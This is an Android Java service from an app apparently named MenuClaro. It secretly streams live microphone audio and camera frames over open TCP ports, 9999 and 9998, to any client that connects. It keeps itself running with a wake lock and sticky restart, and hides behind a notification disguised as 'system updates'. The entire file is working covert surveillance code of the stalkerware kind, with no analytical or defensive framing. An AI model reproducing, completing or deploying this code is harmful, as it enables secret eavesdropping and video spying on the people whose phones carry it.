package com.menuclaro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class StreamService extends Service {

    public static boolean isRunning = false;

    private static final String CHANNEL_ID = "MenuClaroService";
    private static final int PORT_AUDIO = 9999;
    private static final int PORT_VIDEO  = 9998;
    private static final int SAMPLE_RATE = 44100;
    private static final int WIDTH  = 640;
    private static final int HEIGHT = 480;

    private PowerManager.WakeLock wakeLock;
    private AudioRecord audioRecord;
    private Thread audioThread;
    private Thread videoThread;
    private volatile boolean streaming = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startForegroundNotification();
        acquireWakeLock();
        streaming = true;
        isRunning = true;
        startAudioServer();
        startVideoServer();
        return START_STICKY;
    }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).build());
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MenuClaro::StreamWakeLock");
        wakeLock.acquire();
    }

    // ─── ROTATION HELPER ─────────────────────────────────
    private int getSensorRotation() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
            Integer orientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION);
            return orientation != null ? orientation : 90;
        } catch (Exception e) {
            return 90; // default
        }
    }

    private byte[] rotateJpeg(byte[] jpegBytes, int degrees) {
        if (degrees == 0) return jpegBytes;
        try {
            Bitmap original = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.length);
            if (original == null) return jpegBytes;
            Matrix matrix = new Matrix();
            matrix.postRotate(degrees);
            Bitmap rotated = Bitmap.createBitmap(original, 0, 0,
                    original.getWidth(), original.getHeight(), matrix, true);
            original.recycle();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            rotated.compress(Bitmap.CompressFormat.JPEG, 80, baos);
            rotated.recycle();
            return baos.toByteArray();
        } catch (Exception e) {
            return jpegBytes; // return original if rotation fails
        }
    }

    // ─── AUDIO ───────────────────────────────────────────
    private void startAudioServer() {
        audioThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                try {
                    serverSocket = new ServerSocket(PORT_AUDIO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    int buf = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                    audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, buf * 4);
                    audioRecord.startRecording();

                    OutputStream out = client.getOutputStream();
                    byte[] buffer = new byte[2048];
                    while (streaming && !client.isClosed()) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) { out.write(buffer, 0, read); out.flush(); }
                    }
                } catch (Exception e) {
                } finally {
                    try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException ie) { break; }
                }
            }
        });
        audioThread.setDaemon(true);
        audioThread.start();
    }

    // ─── VIDEO - Fresh camera session per client ──────────
    private void startVideoServer() {
        final int rotation = getSensorRotation(); // Read once at start

        videoThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                HandlerThread bgThread = null;
                CameraDevice[] camHolder = {null};
                CameraCaptureSession[] sessionHolder = {null};
                ImageReader imageReader = null;

                try {
                    serverSocket = new ServerSocket(PORT_VIDEO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    final OutputStream[] outHolder = {client.getOutputStream()};

                    bgThread = new HandlerThread("CamBg");
                    bgThread.start();
                    final Handler bgHandler = new Handler(bgThread.getLooper());

                    imageReader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2);
                    final ImageReader finalIR = imageReader;

                    imageReader.setOnImageAvailableListener(reader -> {
                        android.media.Image image = reader.acquireLatestImage();
                        if (image == null) return;
                        try {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);

                            // Rotate frame to correct orientation
                            bytes = rotateJpeg(bytes, rotation);

                            OutputStream out = outHolder[0];
                            if (out == null) return;
                            int len = bytes.length;
                            byte[] header = new byte[]{(byte)(len>>24),(byte)(len>>16),(byte)(len>>8),(byte)len};
                            out.write(header);
                            out.write(bytes);
                            out.flush();
                        } catch (Exception e) {
                            outHolder[0] = null;
                        } finally { image.close(); }
                    }, bgHandler);

                    CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
                    String[] cameraIds = manager.getCameraIdList();
                    final Object lock = new Object();

                    manager.openCamera(cameraIds[0], new CameraDevice.StateCallback() {
                        @Override public void onOpened(CameraDevice camera) {
                            camHolder[0] = camera;
                            try {
                                SurfaceTexture texture = new SurfaceTexture(0);
                                texture.setDefaultBufferSize(WIDTH, HEIGHT);
                                Surface dummy  = new Surface(texture);
                                Surface readerSurface = finalIR.getSurface();
                                CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                builder.addTarget(readerSurface);
                                camera.createCaptureSession(Arrays.asList(dummy, readerSurface),
                                        new CameraCaptureSession.StateCallback() {
                                            @Override public void onConfigured(CameraCaptureSession session) {
                                                sessionHolder[0] = session;
                                                try {
                                                    builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                                                    session.setRepeatingRequest(builder.build(), null, bgHandler);
                                                    synchronized (lock) { lock.notifyAll(); }
                                                } catch (Exception e) { e.printStackTrace(); }
                                            }
                                            @Override public void onConfigureFailed(CameraCaptureSession session) {
                                                synchronized (lock) { lock.notifyAll(); }
                                            }
                                        }, bgHandler);
                            } catch (Exception e) {
                                e.printStackTrace();
                                synchronized (lock) { lock.notifyAll(); }
                            }
                        }
                        @Override public void onDisconnected(CameraDevice camera) { camera.close(); synchronized (lock) { lock.notifyAll(); } }
                        @Override public void onError(CameraDevice camera, int error) { camera.close(); synchronized (lock) { lock.notifyAll(); } }
                    }, bgHandler);

                    synchronized (lock) { lock.wait(3000); }

                    final Socket finalClient = client;
                    while (streaming && !finalClient.isClosed() && outHolder[0] != null) {
                        Thread.sleep(200);
                    }

                } catch (Exception e) {
                } finally {
                    try { if (sessionHolder[0] != null) sessionHolder[0].close(); } catch (Exception ignored) {}
                    try { if (camHolder[0] != null) camHolder[0].close(); } catch (Exception ignored) {}
                    try { if (imageReader != null) imageReader.close(); } catch (Exception ignored) {}
                    try { if (bgThread != null) { bgThread.quitSafely(); bgThread.join(1000); } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(500); } catch (InterruptedException ie) { break; }
                }
            }
        });
        videoThread.setDaemon(true);
        videoThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        streaming = false;
        isRunning = false;
        try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); } } catch (Exception e) {}
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
